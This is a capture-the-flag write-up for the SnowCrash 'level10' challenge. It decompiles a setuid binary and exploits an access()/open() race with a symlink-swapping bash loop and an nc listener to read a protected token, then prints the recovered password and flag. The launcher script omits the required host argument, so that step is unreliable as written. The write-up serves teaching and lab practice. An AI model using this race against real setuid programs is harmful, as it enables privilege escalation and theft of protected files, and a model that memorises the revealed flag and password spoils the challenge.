# level10

- We log as 'level10'

- Two files are located inside the home directory of level10:
>`-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10`
>`-rw-------  1 flag10 flag10     26 Mar  5  2016 token`

- The executable file has setuid & setgid bits permissions

- We can see that the executable will be executed as `flag10` if we execute it being `level10`

- Upon execution without arguments the executable prints:
>`./level10 file host`
>`        sends file to host if you have access to it`

- Upon execution with `token` as first argument and `test` as second argument, the executable prints:
>`You don't have access to token`

- Let's reverse this binary on ghidra, here is the main function in C:
```c
int main(int argc,char **argv)
{
  char *__cp;
  uint16_t uVar1;
  int iVar2;
  int iVar3;
  ssize_t sVar4;
  size_t __n;
  int *piVar5;
  char *pcVar6;
  int in_GS_OFFSET;
  undefined4 *in_stack_00000008;
  char *file;
  char *host;
  int fd;
  int ffd;
  int rc;
  char buffer [4096];
  sockaddr_in sin;
  undefined local_1024 [4096];
  sockaddr local_24;
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n",*in_stack_00000008);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar6 = (char *)in_stack_00000008[1];
  __cp = (char *)in_stack_00000008[2];
  iVar2 = access((char *)in_stack_00000008[1],4);
  if (iVar2 == 0) {
    printf("Connecting to %s:6969 .. ",__cp);
    fflush(stdout);
    iVar2 = socket(2,1,0);
    local_24.sa_data[2] = '\0';
    local_24.sa_data[3] = '\0';
    local_24.sa_data[4] = '\0';
    local_24.sa_data[5] = '\0';
    local_24.sa_data[6] = '\0';
    local_24.sa_data[7] = '\0';
    local_24.sa_data[8] = '\0';
    local_24.sa_data[9] = '\0';
    local_24.sa_data[10] = '\0';
    local_24.sa_data[11] = '\0';
    local_24.sa_data[12] = '\0';
    local_24.sa_data[13] = '\0';
    local_24.sa_family = 2;
    local_24.sa_data[0] = '\0';
    local_24.sa_data[1] = '\0';
    local_24.sa_data._2_4_ = inet_addr(__cp);
    uVar1 = htons(0x1b39);
    local_24.sa_data._0_2_ = uVar1;
    iVar3 = connect(iVar2,&local_24,0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    sVar4 = write(iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    printf("Connected!\nSending file .. ");
    fflush(stdout);
    iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      pcVar6 = strerror(*piVar5);
      printf("Unable to read from file: %s\n",pcVar6);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    write(iVar2,local_1024,__n);
    iVar2 = puts("wrote file!");
  }
  else {
    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar2;
}
```

- We can see that the binary try to access with read rights le file provided as first argument, then try to open it and write it on a socket at port 6969

- This code is vulnerable to race conditions with access and open which means if we pass as parameter a file named `toto` on which i have the rights on i can bypass access check for real ID. I then need to swap the `toto` file with another file name `toto` and the open will affect this new file instead of the first one.

- We first need a small service on port 6969 to listen to the result, let's with nc:
>`nc -l -k 6969 > /tmp/pwn.log`

- We then need a script that will create a file on which everyont has rights named `/tmp/pwn10` then removes it, create a symlink named `/tmp/pwn10` that points on `/home/user/level10/token` then removes it and do this over and over until i get the right timing with the binary:
```bash
#!/bin/bash
while true
do
	touch /tmp/pwn10
	chmod 777 /tmp/pwn10
	rm /tmp/pwn10
	ln -s /home/user/level10/token /tmp/pwn10
	chmod 777 /tmp/pwn10
	rm /tmp/pwn10
done
```

- We also need a small script that will launch the binary again and again:
```bash
#!/bin/bash
while true
do
	/home/user/level10/level10 /tmp/pwn10
done
```

- We launch everything and wait a few seconds then let's cat the file removing those `.*( )*.` spamming in the log
>`level10@SnowCrash:~$ cat /tmp/pwn.log | grep -v ".*( )*."`
>`woupa2yuojeeaaed06riuj63c`

- This is the password to log to flag10:
>`level10@SnowCrash:~$ su flag10`
>`Password: `
>`Don't forget to launch getflag !`
>`flag10@SnowCrash:~$ getflag`
>`Check flag.Here is your token : feulo4b72j7edeahuete3no7c`

- We get the flag: `feulo4b72j7edeahuete3no7c`